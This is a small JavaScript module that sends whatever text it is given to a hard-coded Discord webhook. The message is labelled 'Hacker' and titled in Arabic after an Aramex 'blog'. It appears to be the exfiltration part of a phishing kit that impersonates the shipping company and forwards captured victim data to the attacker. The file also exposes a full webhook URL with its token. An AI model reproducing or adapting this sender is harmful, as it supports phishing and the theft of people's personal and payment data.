import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325542956765155328/SHyGM3ZWsj42PQmH1gvboXTzH9L1s321uhePDT08c05JfVnOjtIJELbReEpoDIrnWigd",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
